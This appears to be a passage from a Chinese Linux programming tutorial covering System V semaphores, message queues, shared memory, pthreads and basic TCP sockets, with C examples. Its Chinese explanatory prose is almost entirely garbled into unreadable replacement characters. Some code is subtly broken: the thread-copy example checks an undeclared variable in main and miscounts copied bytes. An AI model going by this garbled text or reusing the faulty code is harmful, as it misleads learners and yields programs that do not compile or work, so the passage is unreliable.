while(((semop_ret=semop(semid,&semwait,1))==-1)&&(errno==EINTR)); 
if(semop_ret==-1) 
{ 
fprintf(stderr,"[%d]:Decrement Semaphore Error:%s\n\a", 
getpid(),strerror(errno)); 
} 
else 
{ 
while(*c!='\0')fputc(*c++,stderr); 
/* ԭ�Ӳ������,�Ͽ��ͷ���Դ */ 
while(((semop_ret=semop(semid,&semsignal,1))==-1)&&(errno==EINTR)); 
if(semop_ret==-1) 
fprintf(stderr,"[%d]:Increment Semaphore Error:%s\n\a", 
getpid(),strerror(errno)); 
} 
/* ���ܹ����������̷����źŵƵ�ʱ��,����ɾ�����źŵ� */ 
while((wait(&status)==-1)&&(errno==EINTR)); 
/* �źŵ�ֻ�ܹ���ɾ��һ�ε� */ 
if(i==1) 
if(del_semaphore(semid)==-1) 
fprintf(stderr,"[%d]:Destroy Semaphore Error:%s\n\a", 
getpid(),strerror(errno)); 
exit(0); 
} 
�źŵƵ���Ҫ��;�Ǳ����ٽ���Դ(��һ��ʱ��ֻ��һ��������ӵ��). 
3��SystemV��Ϣ���� Ϊ�˱��ڽ���֮��ͨ��,���ǿ���ʹ�ùܵ�ͨ�� SystemVҲ�ṩ�� 
һЩ������ʵ�ֽ��̵�ͨ��.�������Ϣ����. 
#include <sys/types.h> 
#include <sys/ipc.h> 
#include <sys/msg.h> 
int msgget(key_t key,int msgflg); 
int msgsnd(int msgid,struct msgbuf *msgp,int msgsz,int msgflg); 
int msgrcv(int msgid,struct msgbuf *msgp,int msgsz, 
long msgtype,int msgflg); 
int msgctl(Int msgid,int cmd,struct msqid_ds *buf); 

struct msgbuf { 
long msgtype; /* ��Ϣ���� */ 
....... /* ������������ */ 
} 
msgget������semgetһ��,����һ����Ϣ���еı�־.msgctl��semctl�Ƕ���Ϣ���п��� 
.. msgsnd��msgrcv����������������ϢͨѶ��.msgid�ǽ��ܻ��߷��͵���Ϣ���б�־. 
msgp�ǽ��ܻ��߷��͵�����.msgsz����Ϣ�Ĵ�С. �ṹmsgbuf������������������һ�� 
Ϊmsgtype.�����ĳɷ����û������.���ڷ��ͺ���msgflgָ������������ʱ��Ĳ���. 
���ܺ���ָ������Ϣʱ��Ĵ���.һ��Ϊ0. ���պ���msgtypeָ��������Ϣʱ��Ĳ���. 

���msgtype=0,������Ϣ���еĵ�һ����Ϣ.����0���ն�������Ϣ���͵������ֵ�ĵ� 
һ����Ϣ.С��0������Ϣ������С�ڻ��ߵ���msgtype����ֵ��������Ϣ�е���Сһ���� 
Ϣ. ������һ��ʵ�������ͽ���ͨ��.�������������server��client���.�����з��� 
�˺����пͻ���. 
����� server.c 
#include <stdio.h> 
#include <string.h> 
#include <stdlib.h> 
#include <errno.h> 
#include <unistd.h> 
#include <sys/types.h> 
#include <sys/ipc.h> 
#include <sys/stat.h> 
#include <sys/msg.h> 
#define MSG_FILE "server.c" 
#define BUFFER 255 
#define PERM S_IRUSR|S_IWUSR 
struct msgtype { 
long mtype; 
char buffer[BUFFER+1]; 
}; 
int main() 
{ 
struct msgtype msg; 
key_t key; 
int msgid; 
if((key=ftok(MSG_FILE,'a'))==-1) 
{ 
fprintf(stderr,"Creat Key Error:%s\a\n",strerror(errno)); 
exit(1); 
} 
if((msgid=msgget(key,PERM|IPC_CREAT|IPC_EXCL))==-1) 
{ 
fprintf(stderr,"Creat Message Error:%s\a\n",strerror(errno)); 
exit(1); 
} 
while(1) 
{ 
msgrcv(msgid,&msg,sizeof(struct msgtype),1,0); 
fprintf(stderr,"Server Receive:%s\n",msg.buffer); 
msg.mtype=2; 
msgsnd(msgid,&msg,sizeof(struct msgtype),0); 
} 
exit(0); 
} 
---------------------------------------------------------------------------- 
---- 
�ͻ���(client.c) 
#include <stdio.h> 
#include <string.h> 
#include <stdlib.h> 
#include <errno.h> 
#include <sys/types.h> 
#include <sys/ipc.h> 
#include <sys/msg.h> 
#include <sys/stat.h> 
#define MSG_FILE "server.c" 
#define BUFFER 255 
#define PERM S_IRUSR|S_IWUSR 
struct msgtype { 
long mtype; 
char buffer[BUFFER+1]; 
}; 
int main(int argc,char **argv) 
{ 
struct msgtype msg; 
key_t key; 
int msgid; 
if(argc!=2) 
{ 
fprintf(stderr,"Usage:%s string\n\a",argv[0]); 
exit(1); 
} 
if((key=ftok(MSG_FILE,'a'))==-1) 
{ 
fprintf(stderr,"Creat Key Error:%s\a\n",strerror(errno)); 
exit(1); 
} 
if((msgid=msgget(key,PERM))==-1) 
{ 
fprintf(stderr,"Creat Message Error:%s\a\n",strerror(errno)); 
exit(1); 
} 
msg.mtype=1; 
strncpy(msg.buffer,argv[1],BUFFER); 
msgsnd(msgid,&msg,sizeof(struct msgtype),0); 
memset(&msg,'\0',sizeof(struct msgtype)); 
msgrcv(msgid,&msg,sizeof(struct msgtype),2,0); 
fprintf(stderr,"Client receive:%s\n",msg.buffer); 
exit(0); 
} 
ע�����˴�������Ϣ�������û��ɾ��,����Ҫʹ��ipcrm������ɾ����. 
4��SystemV�����ڴ� ����һ������ͨ�ŵķ�����ʹ�ù����ڴ�.SystemV�ṩ�����¼��� 
������ʵ�ֹ����ڴ�. 
#include <sys/types.h> 
#include <sys/ipc.h> 
#include <sys/shm.h> 
int shmget(key_t key,int size,int shmflg); 
void *shmat(int shmid,const void *shmaddr,int shmflg); 
int shmdt(const void *shmaddr); 
int shmctl(int shmid,int cmd,struct shmid_ds *buf); 
shmget��shmctlû��ʲô�ý��͵�.size�ǹ����ڴ�Ĵ�С. shmat���������ӹ����ڴ� 
��.shmdt�������Ͽ������ڴ��.��Ҫ�������ڴ�����ŵ�,�����ڴ���ʵ������ʵ�ֺ� 
ʹ�õ�.shmaddr,shmflg����ֻҪ��0����Ϳ�����.��ʹ��һ�������ڴ�֮ǰ���ǵ���s 
hmat�õ������ڴ�Ŀ�ʼ��ַ,ʹ�ý����Ժ�����ʹ��shmdt�Ͽ�����ڴ�. 
#include <stdio.h> 
#include <string.h> 
#include <errno.h> 
#include <unistd.h> 
#include <sys/stat.h> 
#include <sys/types.h> 
#include <sys/ipc.h> 
#include <sys/shm.h> 
#define PERM S_IRUSR|S_IWUSR 
int main(int argc,char **argv) 
{ 
int shmid; 
char *p_addr,*c_addr; 
if(argc!=2) 
{ 
fprintf(stderr,"Usage:%s\n\a",argv[0]); 
exit(1); 
} 
if((shmid=shmget(IPC_PRIVATE,1024,PERM))==-1) 
{ 
fprintf(stderr,"Create Share Memory Error:%s\n\a",strerror(errno)); 
exit(1); 
} 
if(fork()) 
{ 
p_addr=shmat(shmid,0,0); 
memset(p_addr,'\0',1024); 
strncpy(p_addr,argv[1],1024); 
exit(0); 
} 
else 
{ 
c_addr=shmat(shmid,0,0); 
printf("Client get %s",c_addr); 
exit(0); 
} 
} 
��������Ǹ����̽�����д�뵽�����ڴ�,Ȼ���ӽ��̰����ݶ�����.�������Ҫʹ��ip 
crm�ͷ���Դ��.����ipcs�ҳ�IDȻ����ipcrm shm IDɾ��. 
���: 
����ͨ��(IPC)���������Ļ���,�ںܶ����������л������ʹ�ý���ͨ�ŵĸ��� 
��֪ʶ.��ʵ����ͨ����һ���ǳ����ӵ�����,��������ֻ�Ǽ򵥵Ľ�����һ��.������� 
ѧϰ����ͨ�ŵ���ϸ֪ʶ,��õİ취���Լ����ϵ�д����Ϳ������ֲ�.������������ 
�˺ܶ��֪ʶ����ȥ�ο�.��ϧ�ҿ����ĺܶ඼��Ӣ�ı�д��.������ҵ��������ĵİ� 
���뾡�������.лл! 

7)Linux�����������--�̲߳��� 
ǰ��:Linux���̵߳Ĵ��� 
������Linux���̵߳Ĵ����ͻ�����ʹ��. Linux�µ��߳���һ���ǳ����ӵ�����,�� 
���Ҷ��̵߳�ѧϰ��ʱ�ܺ�,��������ֻ�Ǽ򵥵Ľ����̵߳Ĵ����ͻ�����ʹ��,������ 
�̵ĸ߼�ʹ��(���̵߳�����,�̵߳Ļ���,�̵߳�ͬ���ȵ�����)���Բο��Һ�������� 
����. ���ڹ����̵߳������������Ͽ����ҵ����Ӣ������,�������������������,�� 
�̵߳ĸ߼����Ը���Ȥ�Ļ����Բο�һ��. �ȵ��Ҷ��̵߳��˽�Ƚ���̵�ʱ��,�һ��� 
�����ƪ����.��������߳��˽���꾡��Ҳ�ǳ������ܹ�����������. 
�Ƚ���ʲô���߳�.���Ǳ�д�ĳ����������Կ����ǵ��̵߳�.���ǳ����ǰ���һ���� 
˳����ִ��.�������ʹ���̵߳Ļ�,����ͻ������Ǵ����߳ɵĵط��ֲ�,�������"�� 
��"��ִ��.���ԵĿ���������ӽ��̲���,��ʵ��Ȼ.�ӽ�����ͨ�����������̵ĵ� 
ַ�ռ���ִ�е�.���߳���ͨ��������������ִ�е�,����ͨ��һ������̵߳���ͬ�� 
����ᱻִ�м���.ʹ���̵߳ĺô��ǿ��Խ�ʡ��Դ,�����߳���ͨ����������,����û 
�н��̵�����ô����. 
�̵߳Ĵ�����ʹ�� 
�̵߳Ĵ�����������ļ���������ʵ�ֵ�. 
#include <pthread.h> 
int pthread_create(pthread_t *thread,pthread_attr_t *attr, 
void *(*start_routine)(void *),void *arg); 
void pthread_exit(void *retval); 
int pthread_join(pthread *thread,void **thread_return); 
pthread_create����һ���߳�,thread���������������̵߳�ID,attrָ���̴߳���ʱ�� 
������,������NULL������ʹ��ȱʡ����.start_routine����ָ�����̴߳����ɹ���ʼ 
ִ�еĺ���,arg�����������Ψһһ������.�������ݸ�start_routine�Ĳ���. pthrea 
d_exit������exit�������������˳��߳�.������������߳�,�ͷź�������Դ,������� 
����,ֱ�������߳�ʹ��pthread_join�����ȴ���.Ȼ��*retval��ֵ���ݸ�**thread_ 
return.������������ͷ����Եĺ�����Դ,����retval���ܹ�ָ�����ľֲ�����. pt 
hread_join��wait����һ�������ȴ�ָ�����߳�. ��������ʹ��һ��ʵ��������һ��ʹ 
�÷���.��ʵ����,���Ǿ���Ҫ����һЩ�ļ�.��������������ʵ�ֵ�ǰĿ¼�µ������� 
������.���ݺ�ĺ�׺��Ϊbak 
#include <stdio.h> 
#include <unistd.h> 
#include <stdlib.h> 
#include <string.h> 
#include <errno.h> 
#include <pthread.h> 
#include <dirent.h> 
#include <fcntl.h> 
#include <sys/types.h> 
#include <sys/stat.h> 
#include <sys/time.h> 
#define BUFFER 512 
struct copy_file { 
int infile; 
int outfile; 
}; 
void *copy(void *arg) 
{ 
int infile,outfile; 
int bytes_read,bytes_write,*bytes_copy_p; 
char buffer[BUFFER],*buffer_p; 
struct copy_file *file=(struct copy_file *)arg; 
infile=file->infile; 
outfile=file->outfile; 
/* ��Ϊ�߳��˳�ʱ,���еı����ռ䶼Ҫ���ͷ�,��������ֻ���Լ������ڴ��� */ 
if((bytes_copy_p=(int *)malloc(sizeof(int)))==NULL) pthread_exit(NULL); 
bytes_read=bytes_write=0; 
*bytes_copy_p=0; 
/* ���ǵ���ô�����ļ��� */ 
while((bytes_read=read(infile,buffer,BUFFER))!=0) 
{ 
if((bytes_read==-1)&&(errno!=EINTR))break; 
else if(bytes_read>0) 
{ 
buffer_p=buffer; 
while((bytes_write=write(outfile,buffer_p,bytes_read))!=0) 
{ 
if((bytes_write==-1)&&(errno!=EINTR))break; 
else if(bytes_write==bytes_read)break; 
else if(bytes_write>0) 
{ 
buffer_p+=bytes_write; 
bytes_read-=bytes_write; 
} 
} 
if(bytes_write==-1)break; 
*bytes_copy_p+=bytes_read; 
} 
} 
close(infile); 
close(outfile); 
pthread_exit(bytes_copy_p); 
} 
int main(int argc,char **argv) 
{ 
pthread_t *thread; 
struct copy_file *file; 
int byte_copy,*byte_copy_p,num,i,j; 
char filename[BUFFER]; 
struct dirent **namelist; 
struct stat filestat; 
/* �õ���ǰ·���������е��ļ�(����Ŀ¼)�ĸ��� */ 
if((num=scandir(".",&namelist,0,alphasort))<0) 
{ 
fprintf(stderr,"Get File Num Error:%s\n\a",strerror(errno)); 
exit(1); 
} 
/* ���̷߳���ռ�,��ʵû�б�Ҫ��ô��� */ 
if(((thread=(pthread_t *)malloc(sizeof(pthread_t)*num))==NULL)|| 
((file=(struct copy_file *)malloc(sizeof(struct copy_file)*num))==NULL) 
) 
{ 
fprintf(stderr,"Out Of Memory!\n\a"); 
exit(1); 
} 

for(i=0,j=0;i<num;i++) 
{ 
memset(filename,'\0',BUFFER); 
strcpy(filename,namelist[i]->d_name); 
if(stat(filename,&filestat)==-1) 
{ 
fprintf(stderr,"Get File Information:%s\n\a",strerror(errno)); 
exit(1); 
} 
/* ���Ǻ���Ŀ¼ */ 
if(!S_ISREG(filestat.st_mode))continue; 
if((file[j].infile=open(filename,O_RDONLY))<0) 
{ 
fprintf(stderr,"Open %s Error:%s\n\a",filename,strerror(errno)); 
continue; 
} 
strcat(filename,".bak"); 
if((file[j].outfile=open(filename,O_WRONLY|O_CREAT,S_IRUSR|S_IWUSR)) 
<0) 
{ 
fprintf(stderr,"Creat %s Error:%s\n\a",filename,strerror(errno 
)); 
continue; 
} 
/* �����߳�,�����ļ����� */ 
if(pthread_create(&thread[j],NULL,copy,(void *)&file[j])!=0) 
fprintf(stderr,"Create Thread[%d] Error:%s\n\a",i,strerror(errno)); 
j++; 
} 
byte_copy=0; 
for(i=0;i<j;i++) 
{ 
/* �ȴ��߳̽��� */ 
if(pthread_join(thread[i],(void **)&byte_copy_p)!=0) 
fprintf(stderr,"Thread[%d] Join Error:%s\n\a", 
i,strerror(errno)); 
else 
{ 
if(bytes_copy_p==NULL)continue; 
printf("Thread[%d] Copy %d bytes\n\a",i,*byte_copy_p); 
byte_copy+=*byte_copy_p; 
/* �ͷ�������copy�������洴�����ڴ� */ 
free(byte_copy_p); 
} 
} 
printf("Total Copy Bytes %d\n\a",byte_copy); 
free(thread); 
free(file); 
exit(0); 
} 
�̵߳Ľ��ܾ͵�������,�����̵߳��������Ͽ��Բ鿴������д����. 
Getting Started With POSIX Threads 
The LinuxThreads library 
<δ�����>
��ǰ�� 

8)Linux�����������--������ 

Linuxϵͳ��һ����Ҫ�ص����������繦�ܷǳ�ǿ����������������ռ������������ 
Ӧ��Ҳ��Խ��Խ�ࡣ ���������ʱ����������Linux�������̼���������ÿһ���˴� 
�ڲ���֮�أ�ѧϰLinux�������̣�������������������ᵽ����������� ���Ϊһ 
λ������hacker���������������̼����� 
������������Ѿ�����������Linux�����̷�����鼮��������Ҳ���������� 
�����̷���Ľ̲ģ���Ҷ����� ȥ��һ���ġ��������һ�ʹ��һ�������Linux�� 
���̵İ��������ѧϰLinux��������Ҳ��ʼ���ã�������������˵�Ŀ϶����д� 
��ģ� ������ָ�����������������лл����ˡ� 
����һ���½����棬�һ����ǰ�ļ����½ڲ�ͬ����ǰ���Ҷ��Ǹ�����˵��һ�£� 
�����ڿ�ʼ�һᾡ���ܵ���ϸ��˵��ÿһ�����������÷�������������ȥ���Linux��ΰ 
��������ɣ� 
��ʼ���������� 



������(1) 

1. Linux����֪ʶ���� 
1.1 �ͻ��˳���ͷ���˳��� 
����������ͨ�ĳ�����һ���������������������������������ɵ�--�ͻ��˺ͷ� 
������. 
������������з�������������,�ȴ��ͻ��˵ĳ������в���������.һ�����˵�Ƿ��� 
�˵ĳ��� ��һ���˿��ϼ���,ֱ����һ���ͻ��˵ĳ�����������. 
1.2 ���õ����� 
��������������������������,�����ڵ��Ե�ʱ��Ƚ��鷳,Ϊ�������б�Ҫ֪��һЩ 
���õ��������� 
netstat 
����netstat��������ʾ���������,·�ɱ�ͽӿ�ͳ�Ƶ��������Ϣ.netstat������ 
ѡ�� ���ǳ��õ�ѡ���� -an ������ʾ��ϸ������״̬.����������ѡ�����ǿ���ʹ�ð� 
���ֲ�����ϸ�����. 
telnet 
telnet��һ������Զ�̿��Ƶĳ���,����������ȫ����������������������ǵķ���˳� 
���. �������ǵķ����������ڼ���8888�˿�,���ǿ�����telnet localhost 8888���� 
������˵�״��. 
1.3 TCP/UDP���� 
TCP(Transfer Control Protocol)�������Э����һ���������ӵ�Э��,�����ǵ������ 
��ʹ�� ���Э���ʱ��,������Ա�֤���ǵĿͻ��˺ͷ���˵������ǿɿ���,��ȫ��. 

UDP(User Datagram Protocol)�û����ݱ�Э����һ�ַ��������ӵ�Э��,����Э�鲢�� 
�ܱ�֤���� ���������������ǿɿ���,�����������ڱ�д�ĳ���һ���ǲ���TCPЭ��� 
.. 

�����̣�2�� 

2. �������纯�����ܣ�TCP�� 
Linuxϵͳ��ͨ���ṩ�׽���(socket)�����������̵�.�������ͨ��socket������ 
���������ĵ���,�᷵��һ�� ͨѶ���ļ�������,���ǿ��Խ����������������ͨ���ļ� 
��������������,�����linux���豸�޹��Ե� �ô�.���ǿ���ͨ������������д����ʵ 
������֮������ݽ���. 
2.1 socket 
int socket(int domain, int type,int protocol) 
domain:˵����������������ڵ��������õ�ͨѶЭ��(AF_UNIX��AF_INET��). AF_UN 
IXֻ�ܹ����ڵ�һ��Unixϵͳ���̼�ͨ��,��AF_INET�����Internet��,������������� 
Զ�� ����֮��ͨ��(������ man socketʱ���� domain��ѡ���� PF_*������AF_*,��Ϊ 
glibc��posix��ʵ�� ������PF������AF,�������Ƕ�����ʹ�õ�). 
type:����������������õ�ͨѶЭ��(SOCK_STREAM,SOCK_DGRAM��) SOCK_STREAM���� 
�����õ���TCPЭ��,�������ṩ��˳���,�ɿ�,˫��,�������ӵı�����. SOCK_DGRAM 
���������õ���UDPЭ��,����ֻ���ṩ������,���ɿ�,�����ӵ�ͨ��. 
protocol:��������ָ����type,��������ط�����һ��ֻҪ��0������Ϳ����� sock 
etΪ����ͨѶ��������׼��.�ɹ�ʱ�����ļ�������,ʧ��ʱ����-1,��errno��֪������ 
����ϸ���. 
2.2 bind 
int bind(int sockfd, struct sockaddr *my_addr, int addrlen) 
sockfd:����socket���÷��ص��ļ�������. 
addrlen:��sockaddr�ṹ�ĳ���. 
my_addr:��һ��ָ��sockaddr��ָ��. ��<linux/socket.h>���� sockaddr�Ķ��� 
struct sockaddr{ 
unisgned short as_family; 
char sa_data[14]; 
}; 
��������ϵͳ�ļ�����,����һ�㲻�����ͷ�ļ�,��ʹ������һ���ṹ(struct sock 
addr_in) ������.��<linux/in.h>����sockaddr_in�Ķ��� 
struct sockaddr_in{ 
unsigned short sin_family; 
unsigned short int sin_port; 
struct in_addr sin_addr; 
unsigned char sin_zero[8]; 
������Ҫʹ��Internet����sin_familyһ��ΪAF_INET,sin_addr����ΪINADDR_ANY�� 
ʾ���� ���κε�����ͨ��,sin_port������Ҫ�����Ķ˿ں�.sin_zero[8]���������� 
.. bind�����صĶ˿�ͬsocket���ص��ļ�������������һ��.�ɹ��Ƿ���0,ʧ�ܵ������ 
socketһ�� 
2.3 listen 
int listen(int sockfd,int backlog) 
sockfd:��bind����ļ�������. 
backlog:���������Ŷӵ���󳤶�.���ж���ͻ��˳���ͷ��������ʱ, ʹ�������ʾ 
���Խ��ܵ��Ŷӳ���. listen������bind���ļ���������Ϊ�����׽���.���ص������b 
indһ��. 
2.4 accept 
int accept(int sockfd, struct sockaddr *addr,int *addrlen) 
sockfd:��listen����ļ�������. 
addr,addrlen���������ͻ��˵ĳ�����д��,��������ֻҪ����ָ��Ϳ�����. bind,li 
sten��accept�Ƿ��������õĺ���,accept����ʱ,�������˵ĳ����һֱ��������һ�� 
�ͻ����򷢳�������. accept�ɹ�ʱ�������ķ������˵��ļ�������,���ʱ����� 
���˿������������д��Ϣ��. ʧ��ʱ����-1 
2.5 connect 
int connect(int sockfd, struct sockaddr * serv_addr,int addrlen) 
sockfd:socket���ص��ļ�������. 
serv_addr:�����˷������˵�������Ϣ.����sin_add�Ƿ���˵ĵ�ַ 
addrlen:serv_addr�ĳ��� 
connect�����ǿͻ�������ͬ��������ӵ�.�ɹ�ʱ����0,sockfd��ͬ�����ͨѶ���ļ� 
������ ʧ��ʱ����-1. 
2.6 ʵ�� 
�������˳��� 
/******* ���������� (server.c) ************/ 
#include <stdlib.h> 
#include <stdio.h> 
#include <errno.h> 
#include <string.h> 
#include <netdb.h> 
#include <sys/types.h> 
#include <netinet/in.h> 
#include <sys/socket.h> 
int main(int argc, char *argv[]) 
{ 
int sockfd,new_fd; 
struct sockaddr_in server_addr; 
struct sockaddr_in client_addr; 
int sin_size,portnumber; 
char hello[]="Hello! Are You Fine?\n"; 
if(argc!=2) 
{ 
fprintf(stderr,"Usage:%s portnumber\a\n",argv[0]); 
exit(1); 
} 
if((portnumber=atoi(argv[1]))<0) 
{ 
fprintf(stderr,"Usage:%s portnumber\a\n",argv[0]); 
exit(1); 
} 
/* �������˿�ʼ����socket������ */ 
if((sockfd=socket(AF_INET,SOCK_STREAM,0))==-1) 
{ 
fprintf(stderr,"Socket error:%s\n\a",strerror(errno)); 
exit(1); 
} 
/* ����������� sockaddr�ṹ */ 
bzero(&server_addr,sizeof(struct sockaddr_in)); 
server_addr.sin_family=AF_INET; 
server_addr.sin_addr.s_addr=htonl(INADDR_ANY); 
server_addr.sin_port=htons(portnumber); 
/* ����sockfd������ */ 
if(bind(sockfd,(struct sockaddr *)(&server_addr),sizeof(struct sockaddr))== 
-1) 
{ 
fprintf(stderr,"Bind error:%s\n\a",strerror(errno)); 
exit(1); 
} 
/* ����sockfd������ */ 
if(listen(sockfd,5)==-1) 
{ 
fprintf(stderr,"Listen error:%s\n\a",strerror(errno)); 
exit(1); 
} 
while(1) 
{ 
/* ����������,ֱ���ͻ����������� */ 
sin_size=sizeof(struct sockaddr_in); 
if((new_fd=accept(sockfd,(struct sockaddr *)(&client_addr),&sin_size 
))==-1) 
{ 
fprintf(stderr,"Accept error:%s\n\a",strerror(errno)); 
exit(1); 
} 
fprintf(stderr,"Server get connection from %s\n", 
inet_ntoa(client_addr.sin_addr)); 
if(write(new_fd,hello,strlen(hello))==-1) 
{ 
fprintf(stderr,"Write Error:%s\n",strerror(errno)); 
exit(1); 
} 
/* ���ͨѶ�Ѿ����� */ 
close(new_fd); 
/* ѭ����һ�� */ 
} 
close(sockfd); 
exit(0); 
} 
�ͻ��˳��� 
/******* �ͻ��˳��� client.c ************/ 
#include <stdlib.h> 
#include <stdio.h> 
#include <errno.h> 
#include <string.h> 
#include <netdb.h> 
#include <sys/types.h> 
#include <netinet/in.h> 
#include <sys/socket.h> 
int main(int argc, char *argv[]) 
{ 
int sockfd; 
char buffer[1024]; 
struct sockaddr_in server_addr; 
struct hostent *host; 
int portnumber,nbytes; 
if(argc!=3) 
{ 
fprintf(stderr,"Usage:%s hostname portnumber\a\n",argv[0]); 
exit(1); 
} 
if((host=gethostbyname(argv[1]))==NULL) 
{ 
fprintf(stderr,"Gethostname error\n"); 
exit(1); 
} 
if((portnumber=atoi(argv[2]))<0) 
{ 
fprintf(stderr,"Usage:%s hostname portnumber\a\n",argv[0]); 
exit(1); 
} 
/* �ͻ�����ʼ���� sockfd������ */ 
if((sockfd=socket(AF_INET,SOCK_STREAM,0))==-1) 
{ 
fprintf(stderr,"Socket Error:%s\a\n",strerror(errno)); 
exit(1); 
} 
/* �ͻ�����������˵����� */ 
bzero(&server_addr,sizeof(server_addr)); 
server_addr.sin_family=AF_INET; 
server_addr.sin_port=htons(portnumber); 
server_addr.sin_addr=*((struct in_addr *)host->h_addr); 
/* �ͻ��������������� */ 
if(connect(sockfd,(struct sockaddr *)(&server_addr),sizeof(struct sockaddr) 
)==-1) 
{ 
fprintf(stderr,"Connect Error:%s\a\n",strerror(errno)); 
exit(1); 
} 
/* ���ӳɹ��� */ 
if((nbytes=read(sockfd,buffer,1024))==-1) 
{ 
fprintf(stderr,"Read Error:%s\n",strerror(errno)); 
exit(1); 
} 
buffer[nbytes]='\0'; 
printf("I have received:%s\n",buffer); 
/* ����ͨѶ */ 
close(sockfd); 
exit(0); 
} 
MakeFile 
��������ʹ��GNU ��makeʵ�ó���������. ����make����ϸ˵���� Make ʹ�ý��� 
######### Makefile ########### 
all:server client 
server:server.c 
gcc $^ -o $@ 
client:client.c 
gcc $^ -o $@ 
����make��������������server(��������)��client(�ͻ���) ������./server port 
number& (portnumber���ȡһ������1204�Ҳ���/etc/services�г��ֵĺ��� ����888 
8����),Ȼ������ ./client localhost 8888 ������ʲô���. (��Ҳ������telnet��n 
etstat��һ��.) ������һ����򵥵��������,�����ǲ���Ҳ�е㷳.��������ຯ���� 
�ǻ�û�н���. �һ�����һ�½��е���ϸ��˵��. 
2.7 �ܽ� 
�ܵ���˵���������������������ɵ�--�ͻ��˺ͷ�������.���ǵĽ�������һ����: 
�������� 
socket-->bind-->listen-->accept 
�ͻ��� 
socket-->connect 
-- 

������(3) 

3. �������Ϳͻ�������Ϣ���� 
��һ��������ѧϰת�������緽�����Ϣ����. 
3.1 �ֽ�ת������ 
��������������������͵Ļ���,��Щ�����ڱ�ʾ���ݵ��ֽ�˳���ǲ�ͬ��, ����i386о 
Ƭ�ǵ��ֽ����ڴ��ַ�ĵͶ�,���ֽ��ڸ߶�,��alphaоƬȴ�෴. Ϊ��ͳһ����,��Li 
nux����,��ר�ŵ��ֽ�ת������. 
unsigned long int htonl(unsigned long int hostlong) 
unsigned short int htons(unisgned short int hostshort) 
unsigned long int ntohl(unsigned long int netlong) 
unsigned short int ntohs(unsigned short int netshort) 
�����ĸ�ת��������,h ����host, n ���� network.s ����short l ����long ��һ���� 
���������ǽ��������ϵ�long����ת��Ϊ�����ϵ�long. ������������������Ҳ��� 
.. 
3.2 IP��������ת�� 
�������ϱ�־һ̨����������IP������������.��ô������ôȥ����ת����? 
struct hostent *gethostbyname(const char *hostname) 
struct hostent *gethostbyaddr(const char *addr,int len,int type) 
��<netdb.h>����struct hostent�Ķ��� 
struct hostent{ 
char *h_name; /* ��������ʽ���� */ 
char *h_aliases; /* �����ı��� */ 
int h_addrtype; /* �����ĵ�ַ���� AF_INET*/ 
int h_length; /* �����ĵ�ַ���� ����IP4 ��4�ֽ�32λ*/ 
char **h_addr_list; /* ������IP��ַ�б� */ 
} 
#define h_addr h_addr_list[0] /* �����ĵ�һ��IP��ַ*/ 
gethostbyname���Խ�������(�� linux.yessun.com)ת��Ϊһ���ṹָ��.������ṹ�� 
�洢������������Ϣ 
gethostbyaddr���Խ�һ��32λ��IP��ַ(C0A80001)ת��Ϊ�ṹָ��. 
����������ʧ��ʱ����NULL ������h_errno�������,����h_strerror()���Եõ���ϸ�� 
������Ϣ 
3.3 �ַ�����IP��32λ��IPת��. 
���������������õ�IP�������ּӵ�(192.168.0.1)���ɵ�, ����struct in_addr�ṹ�� 
�õ���32λ��IP, ���������Ǹ�32λIP(C0A80001)�ǵ�192.168.0.1 Ϊ��ת�����ǿ��� 
ʹ�������������� 
int inet_aton(const char *cp,struct in_addr *inp) 
char *inet_ntoa(struct in_addr in) 
�������� a ���� ascii n ����network.��һ��������ʾ��a.b.c.d��IPת��Ϊ32λ��I 
P,�洢�� inpָ������.�ڶ����ǽ�32λIPת��Ϊa.b.c.d�ĸ�ʽ. 
3.4 ������Ϣ���� 
�������������������ʱ����Ҫ֪���˿�.IP�ͷ�����Ϣ.���ʱ�����ǿ���ʹ�����¼� 
������ 
int getsockname(int sockfd,struct sockaddr *localaddr,int *addrlen) 
int getpeername(int sockfd,struct sockaddr *peeraddr, int *addrlen) 
struct servent *getservbyname(const char *servname,const char *protoname) 
struct servent *getservbyport(int port,const char *protoname) 
struct servent 
{ 
char *s_name; /* ��ʽ������ */ 
char **s_aliases; /* �����б� */ 
int s_port; /* �˿ں� */ 
char *s_proto; /* ʹ�õ�Э�� */ 
} 
һ�����Ǻ������⼸������.��Ӧ�ͻ���,������Ҫ�õ����ӵĶ˿ں�ʱ��connect���ó� 
����ʹ�ÿɵõ� ϵͳ����Ķ˿ں�.���ڷ����,������INADDR_ANY����,Ϊ�˵õ��� 
�ӵ�IP���ǿ�����accept���óɹ��� ʹ�ö��õ�IP��ַ. 
��������������Ĭ�϶˿ںͷ���,����˿�21��ftp80��ӦWWW.Ϊ�˵õ�ָ���Ķ˿ں� 
�ķ��� ���ǿ��Ե��õ��ĸ�����,�෴Ϊ�˵õ��˿ںſ��Ե��õ���������. 
3.5 һ������ 
#include <netdb.h> 
#include <stdio.h> 
#include <stdlib.h> 
#include <sys/socket.h> 
#include <netinet/in.h> 
int main(int argc ,char **argv) 
{ 
struct sockaddr_in addr; 
struct hostent *host; 
char **alias; 
if(argc<2) 
{ 
fprintf(stderr,"Usage:%s hostname|ip..\n\a",argv[0]); 
exit(1); 
} 
argv++; 
for(;*argv!=NULL;argv++) 
{ 
/* �������Ǽ�����IP*/ 
if(inet_aton(*argv,&addr.sin_addr)!=0) 
{ 
host=gethostbyaddr((char *)&addr.sin_addr,4,AF_INET); 
printf("Address information of Ip %s\n",*argv); 
} 
else 
{ 
/* ʧ��,�ѵ�������?*/ 
host=gethostbyname(*argv); printf("Address information 

of host %s\n",*argv); 
} 
if(host==NULL) 
{ 
/* ������ ,���˲�����*/ 
fprintf(stderr,"No address information of %s\n",*arg 
v); 
continue; 
} 
printf("Official host name %s\n",host->h_name); 
printf("Name aliases:"); 
for(alias=host->h_aliases;*alias!=NULL;alias++) 
printf("%s ,",*alias); 
printf("\nIp address:"); 
for(alias=host->h_addr_list;*alias!=NULL;alias++) 
printf("%s ,",inet_ntoa(*(struct in_addr *)(*alias))); 
} 
} 
�������������,Ϊ���ж��û��������IP�����������ǵ�������������,��һ�����Ǽ� 
���������IP���Ե���inet_aton, ʧ�ܵ�ʱ��,�ٵ���gethostbyname���õ���Ϣ. 
-- 

������(4) 

4. �����Ķ�д���� 
һ�����ǽ���������,���ǵ���һ�����ǽ���ͨ����.��Linux���������ǰ�潨����ͨ�� 
�������ļ�������,�����������˺Ϳͻ��˽���ͨ��ʱ��,ֻҪ���ļ������������д�� 
����. �����������ļ���дһ��. 
4.1 д����write 
